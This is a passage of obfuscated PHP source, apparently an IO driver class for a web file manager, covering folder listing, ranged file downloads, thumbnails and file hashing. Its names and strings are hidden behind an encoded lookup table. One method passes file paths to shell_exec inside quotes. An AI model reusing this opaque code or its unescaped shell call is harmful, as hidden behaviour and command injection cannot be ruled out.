$ëïîØ±â[$ŠÂí°ß[86]]); foreach ($ëïîØ±â as $­Ö²æŸ™) { if ($­Ö²æŸ™[$ŠÂí°ß[33]] == $ŠÂí°ß[78]) { $¿ªíŸÎ[$ŠÂí°ß[81]]++; $ß¯Ç‰æà = $this->getPathInner($­Ö²æŸ™[$ŠÂí°ß[87]]); $this->infoChildren($ß¯Ç‰æà, $¿ªíŸÎ); } else { $¿ªíŸÎ[$ŠÂí°ß[80]]++; $¿ªíŸÎ[$ŠÂí°ß[79]] += $­Ö²æŸ™[$ŠÂí°ß[79]]; } } } public function fileSubstr($ûŠ×ç›, $œÄåá†Ã, $ôŸ†£¯—) { } public function listAll($ê­ÕúŠ‘) { } public function listAllMake($ƒ¢¯¾Æ¤, &$¹–×‘ ‘) { $Ãä¼­£ =& $_SERVER[¿ğÚ‰±–]; check_abort_echo(); $úî­ùÓ = $this->listPath($ƒ¢¯¾Æ¤, !0); if (!$úî­ùÓ) { return; } $€ëÆù“æ = array_merge($úî­ùÓ[$Ãä¼­£[85]], $úî­ùÓ[$Ãä¼­£[86]]); foreach ($€ëÆù“æ as $Èë§ÆšĞ) { $ó¡Èı† = $Èë§ÆšĞ[$Ãä¼­£[33]] == $Ãä¼­£[78]; $ŸÁÔ‘‘¥ = array($Ãä¼­£[87] => $Èë§ÆšĞ[$Ãä¼­£[87]], $Ãä¼­£[78] => $ó¡Èı†); if (isset($Èë§ÆšĞ[$Ãä¼­£[79]])) { $ŸÁÔ‘‘¥[$Ãä¼­£[79]] = $Èë§ÆšĞ[$Ãä¼­£[79]]; } if (isset($Èë§ÆšĞ[$Ãä¼­£[88]])) { $ŸÁÔ‘‘¥[$Ãä¼­£[88]] = $Èë§ÆšĞ[$Ãä¼­£[88]]; } if (!$ó¡Èı†) { $¹–×‘ ‘[] = $ŸÁÔ‘‘¥; continue; } $¹–×‘ ‘[] = $ŸÁÔ‘‘¥; $ÛÈç§ŸÍ = $Èë§ÆšĞ[$Ãä¼­£[87]]; $ó‚Àçñâ = $this->pathDriver; if (substr($Èë§ÆšĞ[$Ãä¼­£[87]], 0, strlen($ó‚Àçñâ)) == $ó‚Àçñâ) { $ÛÈç§ŸÍ = substr($ÛÈç§ŸÍ, strlen($ó‚Àçñâ)); } $this->listAllMake($ÛÈç§ŸÍ, $¹–×‘ ‘); } } public function listAllSimple($ô­‰¥Å”, $™ø¢éñ = false) { $­¾‰£İË = $this->listAll($ô­‰¥Å”); return $this->listAllSimpleMake($­¾‰£İË, $this->getPathOuter($ô­‰¥Å”), $™ø¢éñ); } public function listAllSimpleMake($§¹‰á—ö, $À¯õõü, $ÆÎ‹üÍâ) { $À˜Ûºäœ =& $_SERVER[¿ğÚ‰±–]; $ßèæêƒ° = array(); $À¯õõü = rtrim(get_path_father($À¯õõü), $À˜Ûºäœ[8]) . $À˜Ûºäœ[8]; foreach ($§¹‰á—ö as $œç–Àğå) { $ååëŒĞü = array($À˜Ûºäœ[87] => $œç–Àğå[$À˜Ûºäœ[87]], $À˜Ûºäœ[89] => $œç–Àğå[$À˜Ûºäœ[87]], $À˜Ûºäœ[78] => $œç–Àğå[$À˜Ûºäœ[78]]); if (isset($œç–Àğå[$À˜Ûºäœ[79]]) && !$œç–Àğå[$À˜Ûºäœ[78]]) { $ååëŒĞü[$À˜Ûºäœ[79]] = $œç–Àğå[$À˜Ûºäœ[79]]; } if (isset($œç–Àğå[$À˜Ûºäœ[88]])) { $ååëŒĞü[$À˜Ûºäœ[88]] = $œç–Àğå[$À˜Ûºäœ[88]]; } if (is_array($œç–Àğå[$À˜Ûºäœ[90]])) { $ååëŒĞü[$À˜Ûºäœ[89]] = $œç–Àğå[$À˜Ûºäœ[90]][$À˜Ûºäœ[87]]; $ååëŒĞü[$À˜Ûºäœ[79]] = $œç–Àğå[$À˜Ûºäœ[90]][$À˜Ûºäœ[79]]; $ååëŒĞü[$À˜Ûºäœ[88]] = $œç–Àğå[$À˜Ûºäœ[90]][$À˜Ûºäœ[88]]; } else { if (substr($œç–Àğå[$À˜Ûºäœ[87]], 0, strlen($À¯õõü)) == $À¯õõü) { $ååëŒĞü[$À˜Ûºäœ[87]] = substr($œç–Àğå[$À˜Ûºäœ[87]], strlen($À¯õõü)); } } $Î••š‚Ñ = $œç–Àğå[$À˜Ûºäœ[78]] ? $À˜Ûºäœ[8] : $À˜Ûºäœ[12]; $ååëŒĞü[$À˜Ûºäœ[89]] = rtrim($ååëŒĞü[$À˜Ûºäœ[89]], $À˜Ûºäœ[8]) . $Î••š‚Ñ; $ååëŒĞü[$À˜Ûºäœ[87]] = $À˜Ûºäœ[8] . trim($ååëŒĞü[$À˜Ûºäœ[87]], $À˜Ûºäœ[8]) . $Î••š‚Ñ; if (!$ÆÎ‹üÍâ) { $È­èµÕ× = explode($À˜Ûºäœ[8], trim($ååëŒĞü[$À˜Ûºäœ[87]], $À˜Ûºäœ[8])); $ååëŒĞü[$À˜Ûºäœ[87]] = $À˜Ûºäœ[8] . implode($À˜Ûºäœ[8], array_slice($È­èµÕ×, 1)) . $Î••š‚Ñ; } $ßèæêƒ°[] = $ååëŒĞü; } return array_sort_by($ßèæêƒ°, $À˜Ûºäœ[87]); } public function upload($Ó£«şÇ¤, $îóÓò½ì, $•ºõ‰‰ì = false, $ò€¶¢ö† = REPEAT_REPLACE) { } public function uploadFileByID($ÃÓ®³Ää, $ ´îŠë¢, $éçÍ»Õ¨) { } public function uploadFileByPath($÷»ãô½©, $” íš‘‡, $×ÒÏÌ’« = array()) { } public function isUploadServer() { $¬ƒåÀŞ§ =& $_SERVER[¿ğÚ‰±–]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¬ƒåÀŞ§[91]) { return !0; } return $GLOBALS[$¬ƒåÀŞ§[6]][$¬ƒåÀŞ§[92]][$¬ƒåÀŞ§[93]]; } public function isFileOutServer() { $à¥ò¥Ë• =& $_SERVER[¿ğÚ‰±–]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $à¥ò¥Ë•[91]) { return !0; } return $GLOBALS[$à¥ò¥Ë•[6]][$à¥ò¥Ë•[92]][$à¥ò¥Ë•[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($âÀÕ¸) { $ÜÁÄ²ß¼ =& $_SERVER[¿ğÚ‰±–]; if (!$this->isCdnHost()) { return $âÀÕ¸; } return str_replace(trim(get_url_root($âÀÕ¸), $ÜÁÄ²ß¼[8]), trim($this->cdnHost, $ÜÁÄ²ß¼[8]), $âÀÕ¸); } public function uploadLink($‚µïØ›ù, $ğªÚ‘™û = 0) { $…İĞ°ñˆ =& $_SERVER[¿ğÚ‰±–]; if ($this->isUploadServer()) { return; } $ğ‰·ğì¥ = $this->getType(); if (!in_array($ğ‰·ğì¥, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $·¶‚üåı = 1024 * 1024 * 10; $‘â¿¤ÉŒ = $ğªÚ‘™û <= $·¶‚üåı ? $…İĞ°ñˆ[95] : $…İĞ°ñˆ[96]; $‰òìÈÓ = (!$ğªÚ‘™û ? 1 : ceil($ğªÚ‘™û / pow(1024, 3))) * 3600 * 4; $Ñ¡ë–Ÿ = $this->{$‘â¿¤ÉŒ}($‚µïØ›ù, $‰òìÈÓ); if ($Ñ¡ë–Ÿ) { $Ñ¡ë–Ÿ[$…İĞ°ñˆ[97]] = $‚µïØ›ù; $Ñ¡ë–Ÿ[$…İĞ°ñˆ[98]] = $ğ‰·ğì¥; } return $Ñ¡ë–Ÿ; } public function uploadFormData($Èó•øæÛ, $ÕÈ§—ÊÌ = 3600) { } public function multiUploadFormData($Ô¶ÌºÅÜ, $¼îÅÜİ = 3600) { } public function download($ä¡êèÔÇ, $Ñ½æå°) { } public function ext($üˆ¦ öß) { $­×™öªà =& $_SERVER[¿ğÚ‰±–]; if (strpos($üˆ¦ öß, $­×™öªà[8]) === -1) { $¿úÖÜïÜ = $üˆ¦ öß; } else { $¿úÖÜïÜ = $this->pathThis($üˆ¦ öß); } $‡ºËşÆ = $­×™öªà[12]; if (strstr($¿úÖÜïÜ, $­×™öªà[10])) { $‡ºËşÆ = substr($¿úÖÜïÜ, strrpos($¿úÖÜïÜ, $­×™öªà[10]) + 1); $‡ºËşÆ = strtolower($‡ºËşÆ); } if (strlen($‡ºËşÆ) > 3 && preg_match($­×™öªà[99], $‡ºËşÆ, $Ø–ñœŠÇ)) { $‡ºËşÆ = $­×™öªà[12]; } return $‡ºËşÆ; } public function pathThis($¦ø¥éùå) { $€…•Ãöê =& $_SERVER[¿ğÚ‰±–]; $¦ø¥éùå = str_replace($€…•Ãöê[100], $€…•Ãöê[8], rtrim($¦ø¥éùå, $€…•Ãöê[8])); $”ÅÈ‹Ô = strrpos($¦ø¥éùå, $€…•Ãöê[8]); if ($”ÅÈ‹Ô === !1) { return $¦ø¥éùå; } return substr($¦ø¥éùå, $”ÅÈ‹Ô + 1); } public function pathFather($É×Á¥™ë) { $‘ˆŸ£¾ =& $_SERVER[¿ğÚ‰±–]; $É×Á¥™ë = str_replace($‘ˆŸ£¾[100], $‘ˆŸ£¾[8], rtrim($É×Á¥™ë, $‘ˆŸ£¾[8])); $©‘Ù‡¤ = strrpos($É×Á¥™ë, $‘ˆŸ£¾[8]); if ($©‘Ù‡¤ === !1) { return $‘ˆŸ£¾[12]; } return substr($É×Á¥™ë, 0, $©‘Ù‡¤ + 1); } public function hashSimple($‡…áúşÄ) { $Óğ“÷ã  =& $_SERVER[¿ğÚ‰±–]; if (!$‡…áúşÄ) { return md5($Óğ“÷ã [12]); } $”Œá´˜ = $this->size($‡…áúşÄ); $Î¾ë™–§ = 200; $ô²ı³şŞ = 50; if ($”Œá´˜ <= $Î¾ë™–§ * $ô²ı³şŞ) { return $this->hashMd5($‡…áúşÄ) . $”Œá´˜; } $µá·©£Ä = intval($”Œá´˜ / $ô²ı³şŞ); $‘¥Ä–£ = $Óğ“÷ã [12]; for ($ÎŸß¸®ª = 0; $ÎŸß¸®ª < $ô²ı³şŞ; $ÎŸß¸®ª++) { $‘¥Ä–£ .= $this->fileSubstr($‡…áúşÄ, $µá·©£Ä * $ÎŸß¸®ª, $Î¾ë™–§); } $‘¥Ä–£ .= $this->fileSubstr($‡…áúşÄ, $”Œá´˜ - $Î¾ë™–§, $Î¾ë™–§); return md5($‘¥Ä–£) . $”Œá´˜; } public static $md5Cache = array(); public function hashMd5($ßØŸè„) { if (!$ßØŸè„) { return md5($_SERVER[¿ğÚ‰±–][12]); } $ßØŸè„ = $this->iconvSystem($ßØŸè„); if (isset(self::$md5Cache[$ßØŸè„])) { return self::$md5Cache[$ßØŸè„]; } self::$md5Cache[$ßØŸè„] = $this->hashMd5Shell($ßØŸè„); if (!self::$md5Cache[$ßØŸè„]) { self::$md5Cache[$ßØŸè„] = @md5_file($ßØŸè„); } return self::$md5Cache[$ßØŸè„]; } private function hashMd5Shell($®ÌÕôÍõ) { $·ŒÃãè =& $_SERVER[¿ğÚ‰±–]; if (!$®ÌÕôÍõ) { return md5($·ŒÃãè[12]); } if (!function_exists($·ŒÃãè[101])) { return !1; } $©Ö‚¸± = array($·ŒÃãè[102], $·ŒÃãè[103]); $ÓõáÎâœ = Cache::get($·ŒÃãè[104]); if (!$ÓõáÎâœ) { $¢ƒ´º—Ï = BASIC_PATH . $·ŒÃãè[105]; $ôèÀß­ê = md5_file($¢ƒ´º—Ï); $ÓõáÎâœ = $·ŒÃãè[106]; foreach ($©Ö‚¸± as $ö©¡ãÆë) { $”×ãØÆ = shell_exec($ö©¡ãÆë . "\x20\42{$¢ƒ´º—Ï}\x22"); if ($”×ãØÆ && substr(trim($”×ãØÆ), 0, 32) == $ôèÀß­ê) { $ÓõáÎâœ = $ö©¡ãÆë; break; } } Cache::set($·ŒÃãè[104], $ÓõáÎâœ, 3600); } if ($ÓõáÎâœ == $·ŒÃãè[106]) { return !1; } $”×ãØÆ = shell_exec($ÓõáÎâœ . "\x20\42{$®ÌÕôÍõ}\x22"); $”×ãØÆ = str_replace($·ŒÃãè[107], $·ŒÃãè[12], $”×ãØÆ); return substr($”×ãØÆ, 0, 32); } public function link($µ–¬™ßÍ) { return $µ–¬™ßÍ; } public function fileOut($›Æù…Œõ, $ëí¦‘Ÿ = false, $èïîãÑ¥ = false, $¢±Â = '') { $ãŒÁëû¦ =& $_SERVER[¿ğÚ‰±–]; $this->cacheMethod(null, null); if (!$›Æù…Œõ || !$this->exist($›Æù…Œõ)) { show_json(LNG($ãŒÁëû¦[108]), !1, $èïîãÑ¥); } $òêÓµ¦ = $this->getType() == $ãŒÁëû¦[109]; $ØƒƒŒœ¥ = $GLOBALS[$ãŒÁëû¦[6]][$ãŒÁëû¦[92]][$ãŒÁëû¦[110]][$ãŒÁëû¦[111]]; $‘™‘«ò± = (double) $GLOBALS[$ãŒÁëû¦[6]][$ãŒÁëû¦[92]][$ãŒÁëû¦[110]][$ãŒÁëû¦[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ìü¯áÕ = $this->infoFull($›Æù…Œõ); $í†É«–² = $ìü¯áÕ[$ãŒÁëû¦[79]]; $‡è±ËßÀ = gmdate($ãŒÁëû¦[113], $ìü¯áÕ[$ãŒÁëû¦[88]]); $ëšà²Ìª = $èïîãÑ¥ ? $èïîãÑ¥ : $this->iconvApp($ìü¯áÕ[$ãŒÁëû¦[32]]); $ãµƒçØ = 0; $ê˜•Ç = $í†É«–² - 1; $œ§ıêÖì = $this->ext($ëšà²Ìª); if (in_array($œ§ıêÖì, array($ãŒÁëû¦[114], $ãŒÁëû¦[115], $ãŒÁëû¦[116], $ãŒÁëû¦[117]))) { $œ§ıêÖì = $ãŒÁëû¦[118]; } if (in_array($œ§ıêÖì, array($ãŒÁëû¦[119]))) { $œ§ıêÖì = $ãŒÁëû¦[120]; } if (!$¢±Â) { $¢±Â = md5($‡è±ËßÀ . $í†É«–²); } $¢±Â = $ãŒÁëû¦[121] . $¢±Â . $ãŒÁëû¦[121]; $Ó¬ó…Ÿ = get_file_mime($œ§ıêÖì); $Õ­î³ã‚ = !0; $Õ­î³ã‚ = isset($_GET[$ãŒÁëû¦[122]]) ? !1 : !0; if ($ëí¦‘Ÿ === !1 && !mime_support($Ó¬ó…Ÿ)) { $Ó¬ó…Ÿ = $ãŒÁëû¦[123]; } header($ãŒÁëû¦[124]); header($ãŒÁëû¦[125] . $Ó¬ó…Ÿ); $“ïÏ¿“° = rawurlencode($ëšà²Ìª); $“ïÏ¿“° = $ãŒÁëû¦[121] . $“ïÏ¿“° . $ãŒÁëû¦[126] . $“ïÏ¿“°; if ($ëí¦‘Ÿ) { header($ãŒÁëû¦[127]); header($ãŒÁëû¦[128] . $“ïÏ¿“°); } else { if ($Õ­î³ã‚) { header($ãŒÁëû¦[129] . $“ïÏ¿“°); } } $Ï±ĞáŸÍ = 3600 * 24 * 30; header($ãŒÁëû¦[130]); header($ãŒÁëû¦[131]); header($ãŒÁëû¦[132] . $Ï±ĞáŸÍ); header($ãŒÁëû¦[133] . gmdate($ãŒÁëû¦[113], time() + $Ï±ĞáŸÍ) . $ãŒÁëû¦[134]); if (isset($_SERVER[$ãŒÁëû¦[135]]) && strtotime($_SERVER[$ãŒÁëû¦[135]]) == $ìü¯áÕ[$ãŒÁëû¦[88]]) { header($ãŒÁëû¦[136], !0, 304); die; } if (isset($_SERVER[$ãŒÁëû¦[137]]) && $_SERVER[$ãŒÁëû¦[137]] == $¢±Â) { header($ãŒÁëû¦[138] . $¢±Â, !0, 304); die; } header($ãŒÁëû¦[138] . $¢±Â); header($ãŒÁëû¦[139] . $‡è±ËßÀ . $ãŒÁëû¦[134]); header($ãŒÁëû¦[140] . $ëšà²Ìª); header($ãŒÁëû¦[141]); header($ãŒÁëû¦[142] . $í†É«–²); header($ãŒÁëû¦[143]); Hook::trigger($ãŒÁëû¦[144], $›Æù…Œõ, $í†É«–², $ëšà²Ìª, $œ§ıêÖì); if (!$ëí¦‘Ÿ && $œ§ıêÖì == $ãŒÁëû¦[145]) { if ($í†É«–² > 1024 * 1024 * 5) { die; } $±öËÈ“Ï = $this->getContent($›Æù…Œõ); $±öËÈ“Ï = Html::clearSVG($±öËÈ“Ï); header($ãŒÁëû¦[146] . strlen($±öËÈ“Ï)); echo $±öËÈ“Ï; die; } $…½ú¦ = strtolower($_SERVER[$ãŒÁëû¦[147]]); if ($òêÓµ¦ && $…½ú¦ && $ØƒƒŒœ¥) { if (strstr($…½ú¦, $ãŒÁëû¦[148])) { header($ãŒÁëû¦[149] . $›Æù…Œõ); } else { if (strstr($…½ú¦, $ãŒÁëû¦[150])) { header($ãŒÁëû¦[151] . $›Æù…Œõ); } else { if (strstr($…½ú¦, $ãŒÁëû¦[152])) { header($ãŒÁëû¦[153] . $›Æù…Œõ); } } } if ($‘™‘«ò±) { header($ãŒÁëû¦[154] . $‘™‘«ò±); } return; } if (isset($_SERVER[$ãŒÁëû¦[155]])) { if (preg_match($ãŒÁëû¦[156], $_SERVER[$ãŒÁëû¦[155]], $“×‡¢’Õ)) { $ãµƒçØ = intval($“×‡¢’Õ[1]); $ãµƒçØ = $ãµƒçØ <= 0 ? 0 : ($ãµƒçØ >= $ê˜•Ç ? $ê˜•Ç : $ãµƒçØ); if (!empty($“×‡¢’Õ[2])) { $­ƒ½õ»í = intval($“×‡¢’Õ[2]); $ê˜•Ç = $­ƒ½õ»í < $ãµƒçØ ? $ãµƒçØ : ($­ƒ½õ»í >= $ê˜•Ç ? $ê˜•Ç : $­ƒ½õ»í); } } header($ãŒÁëû¦[157]); header("\103\157\156\x74\145\156\x74\55\x52\141\156\147\x65\x3a\40\x62\171\164\x65\x73\40{$ãµƒçØ}\55{$ê˜•Ç}\x2f" . $í†É«–²); } else { header($ãŒÁëû¦[158]); } header($ãŒÁëû¦[159]); header($ãŒÁëû¦[160]); $©Ú—î‰ = !0; if ($_SERVER[$ãŒÁëû¦[161]] == $ãŒÁëû¦[162] && $í†É«–² > 1204 * 1024 * 1024 * 2) { $©Ú—î‰ = !1; } if ($©Ú—î‰) { header($ãŒÁëû¦[163] . ($ê˜•Ç - $ãµƒçØ + 1)); } if ($_SERVER[$ãŒÁëû¦[164]] == $ãŒÁëû¦[165]) { return; } $ËÁÔÂ”× = array($ãŒÁëû¦[166] => !1, $ãŒÁëû¦[167] => $ãµƒçØ, $ãŒÁëû¦[168] => $ê˜•Ç, $ãŒÁëû¦[169] => $œ§ıêÖì, $ãŒÁëû¦[170] => $ìü¯áÕ, $ãŒÁëû¦[171] => $ãŒÁëû¦[12], $ãŒÁëû¦[172] => 0); $ËÁÔÂ”× = Hook::filter($ãŒÁëû¦[173], $ËÁÔÂ”×); $ğ£€ÓÚÏ = 1024 * 300; $¸Òø¦¹Ù = 0; if ($‘™‘«ò±) { $¸Òø¦¹Ù = intval(1000 * 1000 * ($ğ£€ÓÚÏ / $‘™‘«ò±)); } while ($ãµƒçØ <= $ê˜•Ç) { $›³ÄÉı = timeFloat(); check_abort(); $ñ…€ò¢ = $ê˜•Ç - $ãµƒçØ + 1; if ($ñ…€ò¢ <= $ğ£€ÓÚÏ) { $ğ£€ÓÚÏ = $ñ…€ò¢; } $±öËÈ“Ï = $this->fileSubstr($›Æù…Œõ, $ãµƒçØ, $ğ£€ÓÚÏ); if ($ËÁÔÂ”×[$ãŒÁëû¦[166]]) { $ËÁÔÂ”×[$ãŒÁëû¦[171]] = $±öËÈ“Ï; $ËÁÔÂ”×[$ãŒÁëû¦[172]] = $ãµƒçØ; $ËÁÔÂ”× = Hook::filter($ãŒÁëû¦[174], $ËÁÔÂ”×); $±öËÈ“Ï = $ËÁÔÂ”×[$ãŒÁëû¦[171]]; } echo $±öËÈ“Ï; $ãµƒçØ += $ğ£€ÓÚÏ; if ($ğ£€ÓÚÏ == $ñ…€ò¢) { $ãµƒçØ = $ê˜•Ç + 1; } if ($¸Òø¦¹Ù) { $ªƒ¬İ·é = intval(1000 * 1000 * (timeFloat() - $›³ÄÉı)); $“ä‹ĞÒ‹ = $¸Òø¦¹Ù - $ªƒ¬İ·é; if ($“ä‹ĞÒ‹ > 5) { usleep($“ä‹ĞÒ‹); } } } } public function fileOutServer($í…Æ…œ’, $ë¶çÏØÄ = false, $ˆ™ŞÜŒ† = false, $ çÎî‹è = '') { $this->fileOut($í…Æ…œ’, $ë¶çÏØÄ, $ˆ™ŞÜŒ†, $ çÎî‹è); } public function fileOutLink($İŸÇ °º) { header($_SERVER[¿ğÚ‰±–][175] . $İŸÇ °º); die; } public function cacheMethod($Éœ®ş², $›ğ¡õ±À, $·ÈÓ“Ú¤ = null) { $óÊÌä±Ø =& $_SERVER[¿ğÚ‰±–]; static $à—óäöˆ = array(); $‡Ê¼Ê÷ñ = $›ğ¡õ±À ? ltrim($this->getPathOuter($›ğ¡õ±À), $óÊÌä±Ø[8]) : $óÊÌä±Ø[12]; $Ş•›¾İ¥ = $óÊÌä±Ø[176] . $Éœ®ş² . $óÊÌä±Ø[177] . rtrim($‡Ê¼Ê÷ñ, $óÊÌä±Ø[8]); if (is_null($Éœ®ş²)) { $à—óäöˆ = array(); return; } if (is_null($›ğ¡õ±À)) { foreach ($à—óäöˆ as $Ş•›¾İ¥ => $•¦›ºùµ) { if (!strstr($Ş•›¾İ¥, $óÊÌä±Ø[176] . $Éœ®ş² . $óÊÌä±Ø[178])) { continue; } unset($à—óäöˆ[$Ş•›¾İ¥]); } return; } if (!is_null($·ÈÓ“Ú¤)) { $à—óäöˆ[$Ş•›¾İ¥] = $·ÈÓ“Ú¤; return; } $úœÃÓÜ = isset($à—óäöˆ[$Ş•›¾İ¥]) ? $à—óäöˆ[$Ş•›¾İ¥] : null; if (!is_null($úœÃÓÜ)) { return $úœÃÓÜ; } $úœÃÓÜ = $this->{$Éœ®ş²}($›ğ¡õ±À); $à—óäöˆ[$Ş•›¾İ¥] = $úœÃÓÜ; return $úœÃÓÜ; } public function cacheMethodInfoSet($½Ó§Åí², $°°ØÚûÒ, $ÃŸ¶´ò® = false) { $íéû÷µÏ =& $_SERVER[¿ğÚ‰±–]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($íéû÷µÏ[179], $½Ó§Åí², $°°ØÚûÒ); $this->cacheMethod($íéû÷µÏ[180], $½Ó§Åí², $°°ØÚûÒ ? !1 : !0); if (is_array($ÃŸ¶´ò®)) { $this->cacheMethod($íéû÷µÏ[181], $½Ó§Åí², $ÃŸ¶´ò®); } } public function fileOutImage($Ü¶ÕıÕË, $•ûÓµ¸Ë = 250) { $ü¡ŒÅ¬ =& $_SERVER[¿ğÚ‰±–]; set_timeout(); if (substr($Ü¶ÕıÕË, 0, 4) == $ü¡ŒÅ¬[152]) { $this->fileOutLink($Ü¶ÕıÕË); } $Ÿ¶åŞß = $this->info($Ü¶ÕıÕË); $ıåÀƒÚÒ = !1; $—Ã«—ä‹ = isset($GLOBALS[$ü¡ŒÅ¬[182]]) ? $GLOBALS[$ü¡ŒÅ¬[182]] : array(); if ($—Ã«—ä‹ && $—Ã«—ä‹[$ü¡ŒÅ¬[183]] == $Ÿ¶åŞß[$ü¡ŒÅ¬[87]]) { $Ÿ¶åŞß = $—Ã«—ä‹; $¶âµŸƒÌ = $Ÿ¶åŞß[$ü¡ŒÅ¬[184]]; if ($¶âµŸƒÌ && isset($¶âµŸƒÌ[$ü¡ŒÅ¬[185]])) { if ($¶âµŸƒÌ[$ü¡ŒÅ¬[185]] <= $•ûÓµ¸Ë && $¶âµŸƒÌ[$ü¡ŒÅ¬[186]] <= $•ûÓµ¸Ë) { $ıåÀƒÚÒ = !0; } } } if ($Ÿ¶åŞß[$ü¡ŒÅ¬[79]] <= 1024 * 50 || $ıåÀƒÚÒ || !function_exists($ü¡ŒÅ¬[187]) || $Ÿ¶åŞß[$ü¡ŒÅ¬[169]] == $ü¡ŒÅ¬[188]) { return $this->fileOut($Ü¶ÕıÕË, !1, $Ÿ¶åŞß[$ü¡ŒÅ¬[32]]); } $ôßçÌ¢ = kodIO::hashPath($Ÿ¶åŞß); $‹Ş”ï˜© = "\143\x6f\x76\145\162\x5f{$ôßçÌ¢}\x5f{$•ûÓµ¸Ë}\56\x70\x6e\147"; $‰ûê©û = IO_PATH_SYSTEM_TEMP . $ü¡ŒÅ¬[189]; $”ëÑÖİç = IO::infoFullSimple($‰ûê©û); $Š›î´Ù£ = $”ëÑÖİç && is_array($”ëÑÖİç) ? $”ëÑÖİç[$ü¡ŒÅ¬[87]] : $ü¡ŒÅ¬[12]; if (!$Š›î´Ù£) { $Š›î´Ù£ = IO::mkdir($‰ûê©û); } if ($Ÿ¶åŞß[$ü¡ŒÅ¬[190]] == $ü¡ŒÅ¬[191] && isset($Ÿ¶åŞß[$ü¡ŒÅ¬[192]]) && $Ÿ¶åŞß[$ü¡ŒÅ¬[192]] == kodIO::sourceID($Š›î´Ù£)) { $Ôã“İñŞ = $Ÿ¶åŞß[$ü¡ŒÅ¬[193]]; if ($•ûÓµ¸Ë <= 500) { $«¹ˆ¹µ = preg_replace($ü¡ŒÅ¬[194], $ü¡ŒÅ¬[195], $Ÿ¶åŞß[$ü¡ŒÅ¬[32]]); $Ôã“İñŞ = IO::fileNameExist($Š›î´Ù£, $«¹ˆ¹µ); } return IO::fileOut(KodIO::make($Ôã“İñŞ), !1, $Ÿ¶åŞß[$ü¡ŒÅ¬[32]]); } $„œ„•µ¶ = IO::fileNameExist($Š›î´Ù£, $‹Ş”ï˜©); if ($„œ„•µ¶) { return IO::fileOut(KodIO::make($„œ„•µ¶), !1, $Ÿ¶åŞß[$ü¡ŒÅ¬[32]]); } if ($•ûÓµ¸Ë > 1000) { $this->makeImageCover($Š›î´Ù£, $Ü¶ÕıÕË, $‹Ş”ï˜©, $•ûÓµ¸Ë); $this->makeImageCover($Š›î´Ù£, $Ü¶ÕıÕË, "\143\157\166\x65\162\x5f{$ôßçÌ¢}\x5f\62\65\60\x2e\x70\156\x67", 250); $„œ„•µ¶ = IO::fileNameExist($Š›î´Ù£, $‹Ş”ï˜©); if ($„œ„•µ¶) { return IO::fileOut(KodIO::make($„œ„•µ¶), !1, $Ÿ¶åŞß[$ü¡ŒÅ¬[32]]); } die; } if (!kodIO::allowCover($Ÿ¶åŞß)) { return $this->fileOut($Ü¶ÕıÕË, !1, $Ÿ¶åŞß[$ü¡ŒÅ¬[32]]); } $‡—ø¦‚Ë = Cache::get($‹Ş”ï˜©); if ($‡—ø¦‚Ë == $ü¡ŒÅ¬[196] || $‡—ø¦‚Ë == $ü¡ŒÅ¬[197]) { echo $‡—ø¦‚Ë; die; } Cache::set($‹Ş”ï˜©, $ü¡ŒÅ¬[197], 60); $éÁá÷Îú = array($Š›î´Ù£, $Ÿ¶åŞß[$ü¡ŒÅ¬[87]], $‹Ş”ï˜©, $•ûÓµ¸Ë); $‡üê½’Õ = $ü¡ŒÅ¬[198] . $Ÿ¶åŞß[$ü¡ŒÅ¬[79]] . $ü¡ŒÅ¬[199] . $‹Ş”ï˜© . $ü¡ŒÅ¬[200] . $Ÿ¶åŞß[$ü¡ŒÅ¬[32]] . $ü¡ŒÅ¬[201] . $Ÿ¶åŞß[$ü¡ŒÅ¬[87]]; TaskQueue::add($ü¡ŒÅ¬[202], $éÁá÷Îú, $‡üê½’Õ, $‹Ş”ï˜©); } public function makeImageCover($î©áĞ·¥, $‰ãÒˆš, $¹¸ÊÜ—è, $ÎÃ¾Ü) { $î ÂˆË— =& $_SERVER[¿ğÚ‰±–]; if (IO::fileNameExist($î©áĞ·¥, $¹¸ÊÜ—è)) { return $î ÂˆË—[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ò¬è¦Â® = DATA_THUMB . $¹¸ÊÜ—è; del_file($ò¬è¦Â®); $ºÛµ »À = IO::copy($‰ãÒˆš, TEMP_FILES, !1, $¹¸ÊÜ—è); if (!@file_exists($ºÛµ »À)) { return $î ÂˆË—[204]; } ImageThumb::createThumb($ºÛµ »À, $ò¬è¦Â®, $ÎÃ¾Ü, $ÎÃ¾Ü * 10); if (@file_exists($ò¬è¦Â®)) { Cache::remove($¹¸ÊÜ—è); return IO::move($ò¬è¦Â®, $î©áĞ·¥); } Cache::set($¹¸ÊÜ—è, $î ÂˆË—[196], 600); del_file($ò¬è¦Â®); return $î ÂˆË—[205] . $ºÛµ »À . $î ÂˆË—[74]; } public function fileOutImageServer($È¾‹Ú, $Şœæˆ¾‹ = 250) { $this->fileOutImage($È¾‹Ú, $Şœæˆ¾‹); } public function fileNameAuto($ğ—ªÃº, $¦ÛÇÔ, $ÌåÓ¹ö¾ = REPEAT_RENAME, $¥¿„—¸‚ = false) { $Ë”µó›Ù =& $_SERVER[¿ğÚ‰±–]; $ª¹ÁŸã¹ = $ğ—ªÃº === $Ë”µó›Ù[12] ? $¦ÛÇÔ : rtrim($ğ—ªÃº, $Ë”µó›Ù[8]) . $Ë”µó›Ù[8] . $¦ÛÇÔ; if ($ÌåÓ¹ö¾ == REPEAT_REPLACE || !$this->exist($ª¹ÁŸã¹) || $¥¿„—¸‚ && $ÌåÓ¹ö¾ != REPEAT_RENAME_FOLDER) { return $¦ÛÇÔ; } if ($ÌåÓ¹ö¾ == REPEAT_SKIP) { return !1; } $¬¬åöÌş = $Ë”µó›Ù[10] . get_path_ext($¦ÛÇÔ); $¬¬åöÌş = $¬¬åöÌş == $Ë”µó›Ù[10] || $¥¿„—¸‚ ? $Ë”µó›Ù[12] : $¬¬åöÌş; $¨—Ó¼ˆ— = 1; $™ÍˆŠĞ¡ = substr($¦ÛÇÔ, 0, strlen($¦ÛÇÔ) - 